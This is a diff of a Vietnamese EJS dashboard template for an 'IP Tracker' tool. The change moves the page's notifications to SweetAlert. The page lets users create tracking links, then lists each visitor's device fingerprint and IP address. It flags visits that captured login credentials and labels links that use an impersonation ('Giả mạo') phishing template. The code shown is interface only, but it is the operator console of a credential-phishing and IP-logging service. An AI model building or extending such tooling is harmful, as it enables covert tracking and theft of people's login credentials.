@@ -1,175 +1,139 @@
 <%- include('partials/header_vietnamese') %>
 
 <nav>
-  <ul>
-    <li><strong>IP Tracker</strong> by Gemlogin Tool (TuanHaii)</li>
-  </ul>
+  <ul><li><strong>IP Tracker</strong> by Gemlogin Tool (TuanHaii)</li></ul>
   <ul>
     <li><a href="/key" role="button" class="contrast">Quản lý Key</a></li>
-    <li>
-      <details role="list" dir="rtl">
-        <summary aria-haspopup="listbox" role="link">
-            <img src="<%= user.avatar %>" alt="Avatar" style="width: 32px; height: 32px; border-radius: 50%; vertical-align: middle;">
-             <%= user.username %>
-        </summary>
-        <ul role="listbox">
-          <li><a href="/auth/logout">Đăng xuất</a></li>
-        </ul>
-      </details>
-    </li>
+    <li><details role="list" dir="rtl"><summary aria-haspopup="listbox" role="link"><img src="<%= user.avatar %>" alt="Avatar" style="width: 32px; height: 32px; border-radius: 50%; vertical-align: middle;"> <%= user.username %></summary><ul role="listbox"><li><a href="/auth/logout">Đăng xuất</a></li></ul></details></li>
   </ul>
 </nav>
 
-<!-- VÙNG HIỂN THỊ THÔNG BÁO CHUNG -->
-<div id="toast-container" style="position: fixed; top: 20px; right: 20px; z-index: 9999;"></div>
-
+<!-- VÙNG THÔNG BÁO TĨNH ĐÃ BỊ XÓA -->
 <% if (!hasActiveKey) { %>
-    <div class="toast error" style="margin-top:1rem;">Key của bạn chưa được kích hoạt hoặc đã hết hạn. Vui lòng vào trang <b>Quản lý Key</b>. Các tính năng chính đã bị tạm khóa.</div>
+    <article class="custom-warning">
+        Key của bạn chưa được kích hoạt hoặc đã hết hạn. Vui lòng vào trang <b>Quản lý Key</b> để các tính năng được mở khóa.
+    </article>
 <% } %>
 
-<% if (status) { %>
-    <% if (status.startsWith('captcha')) { %>
-        <div class="toast error" style="margin-top:1rem;"><strong>Lỗi:</strong> Xác thực Captcha thất bại. Vui lòng thử lại.</div>
-    <% } else if (status === 'link_created') { %>
-        <div class="toast success" style="margin-top:1rem;"><strong>Thành công:</strong> Đã tạo liên kết mới!</div>
-    <% } else if (status === 'settings_saved') { %>
-        <div class="toast success" style="margin-top:1rem;"><strong>Thành công:</strong> Đã lưu cài đặt!</div>
-    <% } %>
-<% } %>
+<style>.custom-warning { border-left: 5px solid var(--pico-color-amber-500); padding: 0.1rem 1.5rem; } </style>
 
 <fieldset <%= !hasActiveKey ? 'disabled' : '' %> >
-  <hgroup>
-    <h2>Tạo liên kết theo dõi mới</h2>
-    <p>Giải Captcha để kích hoạt nút "Tạo liên kết".</p>
-  </hgroup>
-  <form action="/create-link" method="POST">
-    <input type="url" name="targetUrl" placeholder="https://url-dich-cua-ban.com" required>
-    <div class="h-captcha" data-sitekey="<%= hcaptcha_site_key %>" data-callback="onLinkCaptchaSuccess" data-expired-callback="onLinkCaptchaExpired"></div>
-    <button id="create-link-btn" type="submit" disabled>Tạo liên kết</button>
-  </form>
+  <hgroup><h2>Tạo liên kết theo dõi mới</h2><p>Giải Captcha để kích hoạt nút "Tạo liên kết".</p></hgroup>
+  <form action="/create-link" method="POST"><input type="url" name="targetUrl" placeholder="https://url-dich-cua-ban.com" required><div class="h-captcha" data-sitekey="<%= hcaptcha_site_key %>" data-callback="onLinkCaptchaSuccess" data-expired-callback="onLinkCaptchaExpired"></div><button id="create-link-btn" type="submit" disabled>Tạo liên kết</button></form>
 </fieldset>
 <hr>
 
 <h2>Liên kết & Kết quả của bạn</h2>
 <small><em>Các liên kết không có lượt truy cập trong 2 ngày sẽ tự động bị xóa.</em></small>
 
-<% if (links.length === 0) { %>
-    <p style="margin-top: 1rem;">Bạn chưa tạo liên kết nào.</p>
-<% } else { %>
+<% if (links.length === 0) { %><p style="margin-top: 1rem;">Bạn chưa tạo liên kết nào.</p><% } else { %>
     <% links.forEach(link => { %>
         <article>
             <header style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 1rem;">
-                <div><strong>Liên kết:</strong> <code style="cursor: pointer;" onclick="copyAndToast('<%= baseUrl %>/t/<%= link.shortId %>')"><%= baseUrl %>/t/<%= link.shortId %></code></div>
+                <div><strong>Liên kết:</strong> <code style="cursor: pointer;" onclick="copyAndNotify('<%= baseUrl %>/t/<%= link.shortId %>')"><%= baseUrl %>/t/<%= link.shortId %></code></div>
                 <div style="display:flex; gap: 0.5rem;">
                     <a href="/link/settings/<%= link.shortId %>" role="button" class="contrast" style="padding: 5px 10px; margin: 0; white-space: nowrap;">Cài đặt</a>
-                    <form action="/delete-link/<%= link.shortId %>" method="POST" onsubmit="return confirm('Bạn có chắc muốn xóa liên kết này và tất cả kết quả không?');" style="margin:0;">
-                        <button type="submit" class="secondary outline" style="padding: 5px 10px; margin: 0; white-space: nowrap;">Xóa</button>
-                    </form>
+                    <form action="/delete-link/<%= link.shortId %>" method="POST" onsubmit="return confirm('Bạn có chắc muốn xóa liên kết này và tất cả kết quả không?');" style="margin:0;"><button type="submit" class="secondary outline" style="padding: 5px 10px; margin: 0; white-space: nowrap;">Xóa</button></form>
                 </div>
             </header>
             <p style="overflow-wrap: break-word; margin-bottom: 0.5rem;"><strong>Đích:</strong> <a href="<%= link.targetUrl %>" target="_blank" rel="noopener noreferrer"><%= link.targetUrl %></a></p>
             <% if (link.phishTemplate) { %><small><strong style="color:var(--pico-color-red-400)">⚠️ Giả mạo: <%= link.phishTemplate %></strong></small><% } %>
-            
             <% if (link.Visits && link.Visits.length > 0) { %>
                 <div class="overflow-auto" style="margin-top: 1rem;">
                     <table>
-                        <thead>
-                            <tr>
-                                <th>ID Thiết bị</th>
-                                <th>Địa chỉ IP</th>
-                                <th>Thời gian</th>
-                                <th style="text-align: right;">Hành động</th>
-                            </tr>
-                        </thead>
+                        <thead><tr><th>ID Thiết bị</th><th>Địa chỉ IP</th><th>Thời gian</th><th style="text-align: right;">Hành động</th></tr></thead>
                         <tbody>
                             <% link.Visits.forEach(visit => { %>
                                 <tr id="visit-row-<%= visit.id %>">
-                                    <td>
-                                        <code><%= visit.fingerprintId %></code>
-                                        <!-- ICON BÁO CÓ CREDENTIALS -->
-                                        <% if(visit.Credential) { %> <span title="Lượt truy cập này chứa thông tin đăng nhập đã thu thập">🔒</span> <% } %>
-                                    </td>
+                                    <td><code><%= visit.fingerprintId %></code> <% if(visit.Credential) { %> <span title="Có thông tin đăng nhập">🔒</span> <% } %></td>
                                     <td><%= visit.ipAddress %></td>
                                     <td><%= new Date(visit.timestamp).toLocaleString('vi-VN') %></td>
                                     <td style="text-align: right; white-space: nowrap;">
-                                        <a href="<%= hasActiveKey ? '/details/' + visit.id : '#' %>" 
-                                           role="button" class="contrast" 
-                                           <%= !hasActiveKey ? 'aria-disabled="true"' : '' %> 
-                                           onclick="<%= !hasActiveKey ? "showToast('Vui lòng kích hoạt Key để xem chi tiết.', 'error'); return false;" : "" %>" 
-                                           style="padding: 5px 10px; margin:0 5px 0 0;">Chi tiết</a>
-                                        <a href="#" 
-                                           role="button" class="secondary" 
-                                           style="padding: 5px 10px; margin:0;" 
-                                           onclick="deleteVisit(event, '<%= visit.id %>')">Xóa</a>
+                                        <a href="<%= hasActiveKey ? '/details/' + visit.id : '#' %>" role="button" class="contrast" <%= !hasActiveKey ? 'aria-disabled="true"' : '' %> onclick="<%= !hasActiveKey ? "showSwalToast('Vui lòng kích hoạt Key để xem chi tiết.', 'warning'); return false;" : "" %>" style="padding: 5px 10px; margin:0 5px 0 0;">Chi tiết</a>
+                                        <a href="#" role="button" class="secondary" style="padding: 5px 10px; margin:0;" onclick="deleteVisit(event, '<%= visit.id %>')">Xóa</a>
                                     </td>
                                 </tr>
                             <% }) %>
                         </tbody>
                     </table>
                 </div>
-            <% } else { %> 
-                <p style="margin-top: 1rem;"><em>Chưa có lượt truy cập.</em></p>
-            <% } %>
+            <% } else { %> <p style="margin-top: 1rem;"><em>Chưa có lượt truy cập.</em></p> <% } %>
         </article>
     <% }) %>
 <% } %>
 
-<!-- MODAL ĐÃ BỊ XÓA -->
-
 <%- include('partials/footer_vietnamese') %>
 
 <script>
+    // --- KHAI BÁO BIẾN STATUS TỪ SERVER ---
+    const pageStatus = <%- JSON.stringify(status || null) %>;
+
+    // --- LOGIC CAPTCHA ---
     const createLinkBtn = document.getElementById('create-link-btn');
-    
-    // Callback cho Captcha của form tạo link
-    function onLinkCaptchaSuccess(token) { 
-        if(createLinkBtn) createLinkBtn.disabled = false; 
-    }
-    function onLinkCaptchaExpired() { 
-        if(createLinkBtn) createLinkBtn.disabled = true; 
-    }
+    function onLinkCaptchaSuccess(token) { if(createLinkBtn) createLinkBtn.disabled = false; }
+    function onLinkCaptchaExpired() { if(createLinkBtn) createLinkBtn.disabled = true; }
 
-    // Hàm hiển thị thông báo toast chung
-    function showToast(message, type = 'success') {
-        const container = document.getElementById('toast-container');
-        if (!container) return;
-        const toast = document.createElement('div');
-        toast.className = `toast ${type}`;
-        const typeText = type === 'success' ? 'Thành công' : (type === 'error' ? 'Lỗi' : 'Thông báo');
-        toast.innerHTML = `<strong>${typeText}:</strong> ${message}`;
-        toast.style.marginBottom = "10px";
-        container.appendChild(toast);
-        setTimeout(() => {
-            toast.style.opacity = '0';
-            toast.style.transition = 'opacity 0.5s ease';
-            setTimeout(() => toast.remove(), 500);
-        }, 3500);
-    }
-
-    // Hàm sao chép và hiển thị toast
-    function copyAndToast(text){
+    // --- LOGIC HÀNH ĐỘNG CỦA TRANG ---
+    function copyAndNotify(text){
         navigator.clipboard.writeText(text).then(() => {
-            showToast('Đã sao chép vào bộ nhớ tạm!', 'success');
+            showSwalToast('Đã sao chép vào bộ nhớ tạm!');
         }).catch(err => {
-            showToast('Sao chép thất bại!', 'error');
+            showSwalToast('Sao chép thất bại!', 'error');
         });
     }
 
-    // Hàm xóa một lượt truy cập (visit)
     async function deleteVisit(event, visitId) {
         event.preventDefault();
-        if (!confirm('Bạn có chắc muốn xóa kết quả này không?')) return;
+
+        const result = await Swal.fire({
+            title: 'Bạn có chắc chắn?',
+            text: "Bạn sẽ không thể hoàn tác hành động này!",
+            icon: 'warning',
+            showCancelButton: true,
+            confirmButtonText: 'Vâng, xóa nó!',
+            cancelButtonText: 'Hủy bỏ',
+            customClass: { popup: 'swal2-dark' }
+        });
+
+        if (!result.isConfirmed) return;
+
         try {
             const response = await fetch(`/delete-visit/${visitId}`, { method: 'POST' });
-            const result = await response.json();
-            if (result.success) {
+            const data = await response.json();
+            if (data.success) {
                 document.getElementById(`visit-row-${visitId}`)?.remove();
-                showToast('Đã xóa kết quả thành công.', 'success');
+                showSwalToast('Đã xóa kết quả thành công.', 'success');
             } else {
-                showToast(result.message || 'Không thể xóa kết quả.', 'error');
+                showSwalToast(data.message || 'Không thể xóa kết quả.', 'error');
             }
         } catch (error) {
-            showToast('Đã xảy ra lỗi khi cố gắng xóa kết quả.', 'error');
+            showSwalToast('Đã xảy ra lỗi khi xóa kết quả.', 'error');
         }
     }
+    
+    // --- HIỂN THỊ THÔNG BÁO KHI TRANG TẢI ---
+    document.addEventListener('DOMContentLoaded', () => {
+        if (!pageStatus) return;
+
+        const messages = {
+            link_created: { title: 'Tạo liên kết thành công!', icon: 'success' },
+            settings_saved: { title: 'Đã lưu cài đặt!', icon: 'success' },
+            link_deleted: { title: 'Đã xóa liên kết.', icon: 'info' },
+            captcha_error: { title: 'Lỗi Captcha', text: 'Xác thực không thành công, vui lòng thử lại.', icon: 'error' },
+            invalid_url: { title: 'URL không hợp lệ', text: 'Vui lòng nhập một URL hợp lệ.', icon: 'error' }
+        };
+
+        const message = messages[pageStatus];
+        if (message) {
+            Swal.fire({
+                ...message,
+                toast: true,
+                position: 'top-end',
+                showConfirmButton: false,
+                timer: 3500,
+                timerProgressBar: true,
+                customClass: { popup: 'swal2-dark' }
+            });
+        }
+    });
 </script>
